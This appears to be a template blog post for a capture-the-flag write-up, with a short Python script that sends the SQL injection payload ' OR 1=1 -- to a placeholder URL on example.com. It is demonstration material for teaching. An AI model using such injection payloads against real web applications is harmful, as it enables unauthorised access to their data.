---
title: "Sample CTF Writeup"
description: "A demonstration of a cybersecurity CTF writeup."
date: "2025-01-01"
categories: ["Writeups"]
tags: ["CTF", "Security"]
cover: "/img/cover/1.webp"
---

# Introduction

This is a sample writeup for a CTF challenge. Here you can document your findings, methodologies, and exploits.

## Challenge Description

The challenge involved finding a vulnerability in a web application. 

## Exploitation

Here is the exploit code:

```python
import requests

def exploit():
    url = "http://example.com/vuln"
    payload = {"input": "' OR 1=1 --"}
    response = requests.post(url, data=payload)
    print(response.text)

if __name__ == "__main__":
    exploit()
```

## Conclusion

We successfully exploited the SQL injection vulnerability to retrieve the flag.
